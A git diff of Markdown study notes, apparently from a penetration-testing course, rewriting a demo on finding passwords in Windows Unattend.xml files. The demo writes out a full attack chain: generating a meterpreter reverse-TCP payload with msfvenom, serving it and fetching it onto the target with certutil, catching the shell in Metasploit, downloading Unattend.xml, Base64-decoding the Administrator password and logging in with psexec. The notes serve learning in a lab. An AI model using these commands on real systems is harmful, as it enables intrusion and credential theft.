@@ -35,51 +35,111 @@
 ![grafik](https://github.com/user-attachments/assets/448a152b-8e1c-4b6d-a87d-f2def4139e73)
 
 # Windows Configuration Files
+
 ## Unattended Windows Setup
-- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
-  - C:\Windows\Panther\Unattend.xml
-  - C:\Windows\Panther\Autounattend.xml
- - As a security precaution, the password stored in the Unattended Windows Setup configuration file may be encoded in base64.
+- The **Unattended Windows Setup** utility utilizes configuration files that contain user account and system configuration information. Key files include:
+  - `C:\Windows\Panther\Unattend.xml`
+  - `C:\Windows\Panther\Autounattend.xml`
+- For security, passwords in these configuration files may be encoded in Base64.
 
 ## Demo: Searching For Passwords In Windows Configuration Files
+In this demonstration, we gain access to the target via a meterpreter session, locate the `Unattend.xml` file to identify the password, decode it with Base64, and authenticate with the target using PSexec.
 
-We are going to gain access to the target via a meterpreter session. After, we will use our meterpreter session to find the unattend.xml file to identify the password and decode it with the base64 utility and then authenticate with the target via PSexec.
+1. **Check User Privileges on the Target**
+   - Run the following command to check user privileges:
+     ```
+     net user
+     ```
+   - This command shows the user accounts on the target. We use it to confirm if we are running as an unprivileged user.
 
-`netuser` on target: we are running an unprivileged user
-`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST [ownIP] LPORT=1234 -f exe > payload.exe`: We generate a malicious payload
-`ls`
-`python -m SimpleHTTPServer 80`: Set up a simple http server to host the payload.exe file with the python module simpleHTTPserver. We can now download the payload.exe on the target by accessing the webserver on the kali linux machine  own ip:10.10.49.6
-on the target: 
-cmd
-`cd Desktop`
-`certutil -urlchache -f http://[kali system]/payload.exe payload.exe`: file downloading
-before we execute it, we shut down the webserver:
-kali linux:
-`service postgresql start && msfconsole`
-msf5:`use multi/handler`
-msf5:`set payload windows/x64/meterpreter/reverse_tcp`
-msf5:`set LPORT 1234`
-msf5:`set LHOST [kali IP]`
-msf5:`run`
-When we execute the payload on the target system, we will get a meterpreter session
-meterpreter: `sysinfo`: we have access to the target
-meterpreter: `search -f Unattend.xml`
-meterpreter: `cd C:\\`: we can also do it manually
-meterpreter: `cd Windows`
-meterpreter: `Panther`base 
-meterpreter: `dir`: Here we can find the unattend.xml file
-meterpreter: `download unattend.xml`
-meterpreter: `ls`
-meterpreter: `cat unattend.xml`: contains information to the installation of Windows
+2. **Generate a Malicious Payload**
+   - Create a malicious payload using `msfvenom`:
+     ```
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=1234 -f exe > payload.exe
+     ```
+   - This command generates a reverse TCP payload for meterpreter.
 
-*copy password*. If "PlaneText"= false, the password is encoded in base64
-`vim pasword.txt`: paste copied password
-`base64 -d password.txt`: we get the encrypted password
-test it out:
-`psexec.py Administrator@[target IP]`
-`enter decrypted password`
+3. **Set Up a Simple HTTP Server**
+   - Start a simple HTTP server to host the payload:
+     ```
+     python -m SimpleHTTPServer 80
+     ```
+   - This command sets up a basic HTTP server to serve `payload.exe`. We can access the server from the target system to download the payload.
 
-We should get a cmd shell session.
+4. **Download and Execute the Payload on the Target**
+   - On the target system, open the command prompt and navigate to the Desktop:
+     ```
+     cd Desktop
+     ```
+   - Download the payload using `certutil`:
+     ```
+     certutil -urlcache -f http://[kali system IP]/payload.exe payload.exe
+     ```
+   - This command downloads the `payload.exe` from the HTTP server to the target system.
+
+5. **Set Up Metasploit to Handle the Payload**
+   - On our Kali Linux machine, start PostgreSQL and Metasploit:
+     ```
+     service postgresql start && msfconsole
+     ```
+   - Configure Metasploit to handle incoming connections from the payload:
+     ```
+     use multi/handler
+     set payload windows/x64/meterpreter/reverse_tcp
+     set LPORT 1234
+     set LHOST [kali IP]
+     run
+     ```
+   - These commands set up Metasploit to listen for the reverse shell connection.
+
+6. **Establish a Meterpreter Session**
+   - When the payload is executed on the target, a meterpreter session should be created.
+
+7. **Search for the Unattend.xml File**
+   - In the meterpreter session, gather system information:
+     ```
+     sysinfo
+     ```
+   - Search for the `Unattend.xml` file:
+     ```
+     search -f Unattend.xml
+     ```
+   - Alternatively, navigate manually to the directory:
+     ```
+     cd C:\
+     cd Windows
+     cd Panther
+     dir
+     ```
+   - Download the `Unattend.xml` file to our local machine:
+     ```
+     download Unattend.xml
+     ```
+
+8. **Extract and Decode the Password**
+   - View the contents of the `Unattend.xml` file:
+     ```
+     cat Unattend.xml
+     ```
+   - If the `PlainText` attribute is `false`, the password is encoded in Base64. Copy the encoded password.
+   - Create a text file and paste the copied password:
+     ```
+     vim password.txt
+     ```
+   - Decode the Base64-encoded password:
+     ```
+     base64 -d password.txt
+     ```
+
+9. **Authenticate with the Target Using PSexec**
+   - Use PSexec to authenticate with the target system as Administrator:
+     ```
+     psexec.py Administrator@[target IP]
+     ```
+   - Enter the decrypted password when prompted.
+
+   - We should now gain a command shell session on the target system.
+
 
 
 
